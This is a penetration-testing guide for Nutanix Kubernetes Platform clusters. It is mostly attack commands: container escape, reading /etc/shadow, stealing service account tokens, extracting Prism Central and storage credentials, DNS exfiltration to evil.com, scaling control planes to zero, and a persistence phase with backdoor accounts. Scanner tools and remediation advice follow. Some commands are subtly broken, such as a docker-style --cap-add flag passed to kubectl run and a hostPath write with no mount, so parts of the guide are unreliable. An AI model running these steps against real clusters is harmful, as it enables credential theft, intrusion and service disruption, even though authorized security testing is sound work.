# Black Hat Penetration Testing Guide for NKP Kubernetes Clusters

## Overview

This guide provides comprehensive black hat level penetration testing scenarios and free tools to test the security of your NKP (Nutanix Kubernetes Platform) clusters, with a focus on default Nutanix-deployed components.

**⚠️ WARNING**: Only perform these tests in authorized environments. Unauthorized penetration testing is illegal.

---

## Table of Contents

1. [Black Hat Testing Scenarios](#black-hat-testing-scenarios)
2. [Free Penetration Testing Tools](#free-penetration-testing-tools)
3. [Nutanix Component-Specific Tests](#nutanix-component-specific-tests)
4. [Attack Vectors by Component](#attack-vectors-by-component)
5. [Testing Scripts and Automation](#testing-scripts-and-automation)

---

## Black Hat Testing Scenarios

### 1. Container Escape Attacks

#### 1.1 Privileged Container Escape
**Objective**: Escape from a privileged container to the host

```bash
# Test if privileged containers exist
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[]?.securityContext.privileged == true)'

# Attempt escape via /proc/self/root
kubectl run escape-test --image=alpine --privileged --rm -it -- sh
# Inside container:
cat /proc/self/root/etc/shadow
mount /dev/sda1 /mnt
```

#### 1.2 HostPath Mount Escape
**Objective**: Access host filesystem via hostPath volumes

```bash
# Find pods with hostPath mounts
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.volumes[]?.hostPath != null)'

# Test write access to host
kubectl run hostpath-test --image=alpine --rm -it -- \
  sh -c 'echo "pwned" > /host/etc/test'
```

#### 1.3 Capability-Based Escape
**Objective**: Use dangerous capabilities to escape

```bash
# Find pods with dangerous capabilities
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[]?.securityContext.capabilities.add[]? |
    contains("SYS_ADMIN") or contains("NET_ADMIN") or contains("SYS_PTRACE"))'

# Test SYS_ADMIN capability
kubectl run cap-test --image=alpine --rm -it -- \
  --cap-add=SYS_ADMIN -- sh -c 'mount -t tmpfs tmpfs /tmp'
```

#### 1.4 Cgroup Escape
**Objective**: Escape via cgroup manipulation

```bash
# Test cgroup v1 escape
kubectl run cgroup-test --image=alpine --rm -it -- \
  sh -c 'echo $$ > /sys/fs/cgroup/cpu/release_agent'
```

### 2. RBAC and Service Account Attacks

#### 2.1 Service Account Token Theft
**Objective**: Steal service account tokens for privilege escalation

```bash
# List all service accounts
kubectl get serviceaccounts --all-namespaces

# Extract token from mounted secret
kubectl exec <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to access API
TOKEN=$(kubectl exec <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/namespaces

# Test default service account
kubectl get secrets -n default | grep default-token
```

#### 2.2 RBAC Privilege Escalation
**Objective**: Find and exploit overly permissive RBAC

```bash
# Find cluster-admin bindings
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name == "cluster-admin")'

# Find wildcard permissions
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[]?.verbs[]? == "*")'

# Test if service account can create pods
kubectl auth can-i create pods --as=system:serviceaccount:default:default

# Check for pod creation in privileged namespaces
kubectl auth can-i create pods -n kube-system --as=system:serviceaccount:default:default
```

#### 2.3 Impersonation Attacks
**Objective**: Impersonate high-privilege users

```bash
# Test impersonation
kubectl get pods --as=system:serviceaccount:kube-system:default

# Check if you can impersonate cluster-admin
kubectl get nodes --as=system:admin
```

### 3. Network-Based Attacks

#### 3.1 Lateral Movement via Services
**Objective**: Discover and access internal services

```bash
# List all services
kubectl get services --all-namespaces

# Test service access from pod
kubectl run netcat --image=busybox --rm -it -- \
  nc -zv <service-name>.<namespace>.svc.cluster.local 443

# Port scan internal network
kubectl run nmap --image=instrumentisto/nmap --rm -it -- \
  nmap -sS 10.96.0.0/12
```

#### 3.2 DNS Exfiltration
**Objective**: Exfiltrate data via DNS queries

```bash
# Test DNS exfiltration
kubectl run dns-exfil --image=alpine --rm -it -- \
  sh -c 'nslookup $(echo "secret-data" | base64).evil.com'
```

#### 3.3 Network Policy Bypass
**Objective**: Bypass network policies

```bash
# Check network policies
kubectl get networkpolicies --all-namespaces

# Test if policies are enforced
kubectl run bypass-test --image=alpine --rm -it -- \
  wget -O- http://<blocked-service>:8080
```

### 4. Secret and Credential Attacks

#### 4.1 Secret Enumeration
**Objective**: Find and extract secrets

```bash
# List all secrets
kubectl get secrets --all-namespaces

# Extract secret data
kubectl get secret <secret-name> -n <namespace> -o json | \
  jq '.data | to_entries[] | {key: .key, value: (.value | @base64d)}'

# Search for secrets in environment variables
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[]?.env[]?.valueFrom.secretKeyRef != null)'
```

#### 4.2 Image Pull Secret Theft
**Objective**: Steal registry credentials

```bash
# Find image pull secrets
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | select(.type == "kubernetes.io/dockerconfigjson")'

# Extract registry credentials
kubectl get secret <secret-name> -n <namespace> -o json | \
  jq -r '.data[".dockerconfigjson"]' | base64 -d | jq
```

#### 4.3 Sealed Secrets Decryption
**Objective**: Attempt to decrypt sealed secrets

```bash
# List sealed secrets
kubectl get sealedsecrets --all-namespaces

# Check if sealed-secrets controller key is exposed
kubectl get secret -n kube-system | grep sealed-secrets-key

# Attempt to extract key from controller
kubectl exec -n kube-system deployment/sealed-secrets-controller -- \
  cat /tmp/key
```

### 5. Supply Chain Attacks

#### 5.1 Image Registry Attacks
**Objective**: Test image registry security

```bash
# Check allowed registries
kubectl get constraint allowed-container-repos -o yaml

# Test pulling from unauthorized registry
kubectl run test-image --image=evil-registry.com/malware:latest

# Check image pull policies
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[]?.imagePullPolicy == "Always")'
```

#### 5.2 Image Digest Validation
**Objective**: Test if image digest validation is enforced

```bash
# Try deploying with :latest tag
kubectl run test-latest --image=nginx:latest

# Check if digest is required
kubectl get constraint require-image-digest -o yaml
```

### 6. API Server Attacks

#### 6.1 API Server Enumeration
**Objective**: Discover API endpoints and resources

```bash
# List all API resources
kubectl api-resources --verbs=list --namespaced -o name | \
  xargs -n 1 kubectl get --show-kind --ignore-not-found -A

# Test API access
curl -k https://<api-server>/api/v1/namespaces

# Check for exposed metrics
curl -k https://<api-server>/metrics
```

#### 6.2 Admission Controller Bypass
**Objective**: Bypass security policies

```bash
# Test if policies can be bypassed
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privileged-test
spec:
  containers:
  - name: test
    image: alpine
    securityContext:
      privileged: true
EOF

# Check admission controller logs
kubectl logs -n kube-system -l app=gatekeeper
kubectl logs -n kyverno -l app.kubernetes.io/name=kyverno
```

### 7. Node-Level Attacks

#### 7.1 Kubelet Exploitation
**Objective**: Exploit kubelet API

```bash
# Check kubelet port (usually 10250)
curl -k https://<node-ip>:10250/pods

# Test kubelet authentication
curl -k https://<node-ip>:10250/stats/

# Attempt to access container logs
curl -k https://<node-ip>:10250/logs/<namespace>/<pod>/<container>
```

#### 7.2 Node Credential Access
**Objective**: Access node credentials

```bash
# Check for mounted node credentials
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.volumes[]?.hostPath.path |
    contains("/var/lib/kubelet") or contains("/etc/kubernetes"))'
```

### 8. Workload Cluster Attacks

#### 8.1 Management Cluster to Workload Cluster
**Objective**: Escalate from workload to management cluster

```bash
# Check if workload cluster has access to management cluster
kubectl get secrets -n dm-dev-workspace | grep kubeconfig

# Test cross-cluster access
kubectl --kubeconfig=/path/to/mgmt-kubeconfig get clusters
```

#### 8.2 Cluster API Exploitation
**Objective**: Exploit CAPI resources

```bash
# List all clusters
kubectl get clusters --all-namespaces

# Check cluster credentials
kubectl get secrets -n <workspace> | grep cluster

# Attempt to modify cluster spec
kubectl patch cluster <cluster-name> -n <namespace> --type=merge -p \
  '{"spec":{"topology":{"controlPlane":{"replicas":0}}}}'
```

---

## Free Penetration Testing Tools

### 1. Kubernetes-Specific Tools

#### 1.1 Kubescape (Free Tier)
**Purpose**: Kubernetes security scanning and compliance

```bash
# Install
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash

# Scan cluster
kubescape scan framework nsa --exclude-namespaces kube-system,kube-public

# Scan for CVEs
kubescape scan cve --exclude-namespaces kube-system

# Generate HTML report
kubescape scan framework nsa --format html --output report.html
```

**What it tests**:
- RBAC misconfigurations
- Pod security standards
- Network policies
- Secrets management
- Image security
- Compliance frameworks (NSA, MITRE ATT&CK)

#### 1.2 Kubeaudit
**Purpose**: Audit Kubernetes clusters for security issues

```bash
# Install (preferred - via Homebrew)
brew install kubeaudit

# Or install via Go (main package is in cmd/kubeaudit)
go install github.com/Shopify/kubeaudit/cmd/kubeaudit@latest

# Audit cluster
kubeaudit all

# Audit specific namespace
kubeaudit all -n dm-dev-workspace

# Check for specific issues
kubeaudit autofix runAsNonRoot
kubeaudit autofix readOnlyRootFilesystem
```

**What it tests**:
- Run as non-root
- Read-only root filesystem
- Privileged containers
- Capabilities
- Service account tokens

#### 1.3 Kube-hunter
**Purpose**: Hunt for security weaknesses in Kubernetes clusters

```bash
# Install
pip install kube-hunter

# Run as pod (inside cluster)
kubectl run kube-hunter --image=aquasec/kube-hunter --rm -it -- \
  python kubehunter.py --active

# Run from outside cluster
kube-hunter --remote <api-server-ip>
```

**What it tests**:
- Exposed API server
- Exposed kubelet
- Exposed etcd
- Exposed dashboard
- Anonymous access
- Privilege escalation

#### 1.4 Kubesploit
**Purpose**: Post-exploitation framework for Kubernetes

```bash
# Install
git clone https://github.com/cyberark/kubesploit.git
cd kubesploit

# Run agent in compromised pod
kubectl run kubesploit --image=cyberark/kubesploit --rm -it
```

**What it tests**:
- Container escape
- Credential theft
- Lateral movement
- Persistence mechanisms

#### 1.5 Peirates
**Purpose**: Kubernetes penetration testing tool

```bash
# Install
git clone https://github.com/inguardians/peirates.git
cd peirates
docker build -t peirates .

# Run in pod
kubectl run peirates --image=peirates --rm -it -- \
  peirates -i
```

**What it tests**:
- Service account enumeration
- Token extraction
- RBAC privilege escalation
- Secret access
- Cluster-admin access

#### 1.6 Kube-bench
**Purpose**: CIS Kubernetes Benchmark scanner

```bash
# Install
curl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.6.9/kube-bench_0.6.9_linux_amd64.tar.gz -o kube-bench.tar.gz
tar -xvf kube-bench.tar.gz

# Run on master node
./kube-bench master

# Run on worker node
./kube-bench node

# Run as job
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
```

**What it tests**:
- CIS Kubernetes Benchmark compliance
- API server configuration
- etcd configuration
- Kubelet configuration
- Worker node security

### 2. Container Security Tools

#### 2.1 Trivy
**Purpose**: Vulnerability scanner for containers and Kubernetes

```bash
# Install
brew install trivy  # macOS
# or
wget https://github.com/aquasecurity/trivy/releases/download/v0.45.0/trivy_0.45.0_Linux-64bit.tar.gz

# Scan cluster images
trivy k8s cluster --severity HIGH,CRITICAL

# Scan specific namespace
trivy k8s cluster -n dm-dev-workspace

# Scan running images
trivy image <image-name>
```

**What it tests**:
- CVE scanning
- Misconfigurations
- Secret scanning
- License compliance

#### 2.2 Falco
**Purpose**: Runtime security monitoring

```bash
# Install via Helm
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco

# Check rules
kubectl get configmap falco -o yaml
```

**What it detects**:
- Shell execution in containers
- Sensitive file access
- Network activity
- System calls
- Privilege escalation attempts

#### 2.3 Docker Bench Security
**Purpose**: Docker security best practices checker

```bash
# Run
docker run --rm --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security
```

### 3. Network Security Tools

#### 3.1 Nmap
**Purpose**: Network discovery and security auditing

```bash
# Scan Kubernetes services
nmap -sS -p 1-65535 <api-server-ip>

# Scan from inside cluster
kubectl run nmap --image=instrumentisto/nmap --rm -it -- \
  nmap -sS 10.96.0.0/12
```

#### 3.2 Metasploit Framework
**Purpose**: Penetration testing framework

```bash
# Install
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Kubernetes modules
msfconsole
> use auxiliary/scanner/kubernetes/kubernetes_enum
> set RHOSTS <api-server-ip>
> run
```

### 4. Secret Scanning Tools

#### 4.1 GitLeaks
**Purpose**: Detect secrets in Git repositories

```bash
# Install
brew install gitleaks  # macOS
# or
wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz

# Scan repository
gitleaks detect --source . --verbose

# Scan with report
gitleaks detect --source . --report-path gitleaks-report.json
```

#### 4.2 TruffleHog
**Purpose**: Find secrets in Git repositories

```bash
# Install
pip install truffleHog

# Scan repository
truffleHog --regex --entropy=False <repo-url>
```

#### 4.3 Yelp/detect-secrets
**Purpose**: Detect secrets in codebase

```bash
# Install
pip install detect-secrets

# Scan
detect-secrets scan --baseline .secrets.baseline
```

### 5. API Security Tools

#### 5.1 Postman / Burp Suite Community
**Purpose**: API security testing

```bash
# Test Kubernetes API
curl -k -X GET https://<api-server>/api/v1/namespaces \
  -H "Authorization: Bearer $TOKEN"

# Test with different verbs
curl -k -X POST https://<api-server>/api/v1/namespaces \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"metadata":{"name":"test"}}'
```

#### 5.2 OWASP ZAP
**Purpose**: Web application security scanner

```bash
# Install
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://<api-server>
```

### 6. Compliance and Policy Tools

#### 6.1 Polaris
**Purpose**: Kubernetes configuration validation

```bash
# Install
brew install polaris  # macOS
# or
wget https://github.com/FairwindsOps/polaris/releases/download/8.0.0/polaris_8.0.0_linux_amd64.tar.gz

# Scan cluster
polaris audit --audit-path ./deploy/

# Dashboard mode
polaris dashboard --port 8080
```

**What it tests**:
- Resource requests/limits
- Health probes
- Security contexts
- Image pull policies
- Network policies

#### 6.2 Checkov
**Purpose**: Infrastructure as Code security scanning

```bash
# Install
pip install checkov

# Scan Kubernetes manifests
checkov -d ./region-usa/az1/management-cluster/ \
  --framework kubernetes

# Scan with policy filters
checkov -d . --framework kubernetes \
  --check CKV_K8S_*,CKV2_K8S_*
```

---

## Nutanix Component-Specific Tests

### 1. Kommander (NKP Management Plane)

#### 1.1 Kommander API Security
```bash
# Test Kommander API access
kubectl get pods -n kommander
kubectl port-forward -n kommander svc/kommander-kubeaddons-controller-manager 8080:443

# Test authentication
curl -k https://localhost:8080/api/v1/workspaces

# Check for exposed metrics
curl -k https://localhost:8080/metrics
```

#### 1.2 Kommander Service Account Permissions
```bash
# List Kommander service accounts
kubectl get serviceaccounts -n kommander

# Check RBAC
kubectl get rolebindings,clusterrolebindings -n kommander

# Test if Kommander SA can access other namespaces
kubectl auth can-i get secrets --as=system:serviceaccount:kommander:kommander-kubeaddons-controller-manager -n kube-system
```

#### 1.3 Kommander Secrets
```bash
# List secrets in kommander namespace
kubectl get secrets -n kommander

# Check for exposed credentials
kubectl get secret -n kommander -o json | \
  jq '.items[] | select(.type != "kubernetes.io/service-account-token")'
```

### 2. CAPX (Nutanix Cluster API Provider)

#### 2.1 CAPX Controller Security
```bash
# Check CAPX pods
kubectl get pods -n capx-system

# Check CAPX service account permissions
kubectl get clusterrolebindings | grep capx

# Test if CAPX can create clusters
kubectl auth can-i create clusters --as=system:serviceaccount:capx-system:capx-controller-manager
```

#### 2.2 CAPX Credentials
```bash
# Check for Prism Central credentials
kubectl get secrets -n capx-system | grep prism

# Test credential access
kubectl get secret -n capx-system -o json | \
  jq '.items[] | select(.metadata.name | contains("prism") or contains("nutanix"))'
```

### 3. CAREN (Cluster API Runtime Extensions)

#### 3.1 CAREN Webhook Security
```bash
# Check CAREN pods
kubectl get pods -n caren-system

# Test webhook endpoints
kubectl get validatingwebhookconfigurations,mutatingwebhookconfigurations | grep caren

# Check webhook certificates
kubectl get secret -n caren-system | grep webhook
```

#### 3.2 CAREN Runtime Hooks
```bash
# Check CAREN runtime extensions
kubectl get runtimeextensions -n caren-system

# Test hook execution
kubectl logs -n caren-system -l app.kubernetes.io/name=cluster-api-runtime-extensions-nutanix
```

### 4. Nutanix CCM (Cloud Controller Manager)

#### 4.1 CCM Credentials
```bash
# Check CCM credentials
kubectl get secret -n kube-system | grep nutanix-ccm

# Extract credentials
kubectl get secret nutanix-ccm-credentials -n kube-system -o json | \
  jq -r '.data.credentials' | base64 -d | jq
```

#### 4.2 CCM Permissions
```bash
# Check CCM service account
kubectl get serviceaccount -n kube-system | grep nutanix

# Check CCM RBAC
kubectl get clusterrolebindings | grep nutanix-ccm
```

### 5. Nutanix CSI (Container Storage Interface)

#### 5.1 CSI Credentials
```bash
# Check CSI credentials
kubectl get secret -n ntnx-system | grep csi

# Extract CSI credentials
kubectl get secret nutanix-csi-credentials -n ntnx-system -o json | \
  jq -r '.data.key' | base64 -d
```

#### 5.2 CSI Driver Security
```bash
# Check CSI driver pods
kubectl get pods -n ntnx-system

# Check CSI storage classes
kubectl get storageclass

# Test volume provisioning
kubectl create -f - <<EOF
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: test-pvc
spec:
  accessModes:
    - ReadWriteOnce
  storageClassName: nutanix-volume
  resources:
    requests:
      storage: 1Gi
EOF
```

### 6. Cilium CNI

#### 6.1 Cilium Security Policies
```bash
# Check Cilium network policies
kubectl get cnp,ccnp -A

# Test network policy enforcement
kubectl run test-pod --image=alpine --rm -it -- \
  wget -O- http://<blocked-service>:8080
```

#### 6.2 Cilium eBPF Security
```bash
# Check Cilium configuration
kubectl get configmap -n kube-system cilium-config -o yaml

# Check Cilium agent logs
kubectl logs -n kube-system -l k8s-app=cilium
```

### 7. MetalLB Load Balancer

#### 7.1 MetalLB Configuration
```bash
# Check MetalLB configuration
kubectl get configmap -n metallb-system config -o yaml

# Check allocated IPs
kubectl get ipaddresspool -n metallb-system

# Test IP allocation
kubectl get services --all-namespaces -o wide | grep LoadBalancer
```

---

## Attack Vectors by Component

### High-Risk Components

| Component | Namespace | Attack Vector | Risk Level |
|-----------|-----------|---------------|------------|
| **Kommander** | `kommander` | API access, service account tokens, cluster management | 🔴 Critical |
| **CAPX** | `capx-system` | Prism Central credentials, cluster creation | 🔴 Critical |
| **CAREN** | `caren-system` | Webhook manipulation, runtime hooks | 🟠 High |
| **Nutanix CCM** | `kube-system` | Prism Central credentials, node management | 🔴 Critical |
| **Nutanix CSI** | `ntnx-system` | Storage credentials, volume access | 🟠 High |
| **Cilium** | `kube-system` | Network bypass, eBPF manipulation | 🟠 High |
| **MetalLB** | `metallb-system` | IP spoofing, service exposure | 🟡 Medium |

### Testing Priority

1. **Phase 1: Discovery**
   - Enumerate all namespaces and pods
   - Identify Nutanix components
   - Map service accounts and RBAC

2. **Phase 2: Credential Extraction**
   - Extract service account tokens
   - Find Prism Central credentials
   - Locate sealed secrets keys

3. **Phase 3: Privilege Escalation**
   - Test RBAC permissions
   - Attempt cluster-admin access
   - Test cross-namespace access

4. **Phase 4: Lateral Movement**
   - Access management cluster from workload
   - Test cross-cluster communication
   - Exploit CAPI resources

5. **Phase 5: Persistence**
   - Create backdoor service accounts
   - Modify cluster configurations
   - Install malicious workloads

---

## Testing Scripts and Automation

### Automated Testing Script

Create a comprehensive testing script:

```bash
#!/bin/bash
# black-hat-test-suite.sh

set -e

echo "=== NKP Black Hat Penetration Testing Suite ==="
echo ""

# 1. Discovery
echo "[1/5] Discovery Phase..."
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl get serviceaccounts --all-namespaces

# 2. Credential Extraction
echo "[2/5] Credential Extraction..."
kubectl get secrets --all-namespaces | grep -E "nutanix|prism|ccm|csi|kommander"

# 3. RBAC Testing
echo "[3/5] RBAC Testing..."
kubectl get clusterrolebindings | grep -E "cluster-admin|kommander|capx"
kubectl get rolebindings --all-namespaces | grep -E "admin|cluster-admin"

# 4. Security Context Testing
echo "[4/5] Security Context Testing..."
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[]?.securityContext.privileged == true)'

# 5. Network Testing
echo "[5/5] Network Testing..."
kubectl get networkpolicies --all-namespaces
kubectl get services --all-namespaces | grep -E "LoadBalancer|NodePort"

echo ""
echo "=== Testing Complete ==="
```

### Kube-hunter Automated Scan

```bash
#!/bin/bash
# kube-hunter-scan.sh

kubectl run kube-hunter --image=aquasec/kube-hunter:latest --rm -it --restart=Never -- \
  python kubehunter.py --active --report json > kube-hunter-report.json

# Parse results
cat kube-hunter-report.json | jq '.vulnerabilities[] | {severity: .severity, category: .category, vid: .vid}'
```

### Kubescape Automated Scan

```bash
#!/bin/bash
# kubescape-scan.sh

# Scan with all frameworks
kubescape scan framework nsa \
  --exclude-namespaces kube-system,kube-public \
  --format json --output kubescape-nsa.json

kubescape scan framework mitre \
  --exclude-namespaces kube-system,kube-public \
  --format json --output kubescape-mitre.json

# Scan for CVEs
kubescape scan cve \
  --exclude-namespaces kube-system,kube-public \
  --format json --output kubescape-cve.json

# Generate summary
echo "=== Kubescape Scan Summary ==="
jq '.summaryDetails' kubescape-*.json
```

---

## Remediation Recommendations

### Immediate Actions

1. **Rotate All Credentials**
   - Prism Central credentials
   - Service account tokens
   - Image pull secrets

2. **Review RBAC**
   - Remove unnecessary cluster-admin bindings
   - Implement least privilege
   - Audit service account permissions

3. **Harden Security Contexts**
   - Remove privileged containers where possible
   - Drop unnecessary capabilities
   - Enforce read-only root filesystems

4. **Network Hardening**
   - Implement network policies
   - Restrict service types
   - Enable TLS everywhere

5. **Enable Monitoring**
   - Deploy Falco for runtime security
   - Enable audit logging
   - Set up alerting

### Long-Term Improvements

1. **Policy Enforcement**
   - Enable Gatekeeper/Kyverno policies
   - Enforce Pod Security Standards
   - Implement admission controllers

2. **Supply Chain Security**
   - Image scanning in CI/CD
   - Signed images only
   - Private registries

3. **Secrets Management**
   - Use external secrets operator
   - Rotate secrets regularly
   - Encrypt secrets at rest

4. **Compliance**
   - Regular security audits
   - CIS Benchmark compliance
   - SOC 2 / ISO 27001 alignment

---

## References

- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [OWASP Kubernetes Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)
- [MITRE ATT&CK for Kubernetes](https://attack.mitre.org/matrices/enterprise/cloud/kubernetes/)
- [Nutanix Security Documentation](https://portal.nutanix.com/page/documents/details?targetId=Web-Console-Guide-Prism-v6_5:wc-security-wc.html)

---

## Legal Disclaimer

⚠️ **IMPORTANT**: This guide is for authorized security testing only. Unauthorized access to computer systems is illegal and may result in criminal prosecution. Always obtain written authorization before performing penetration testing.

---

**Last Updated**: 2025-01-27
**Maintained By**: Security Team
**Review Cycle**: Quarterly

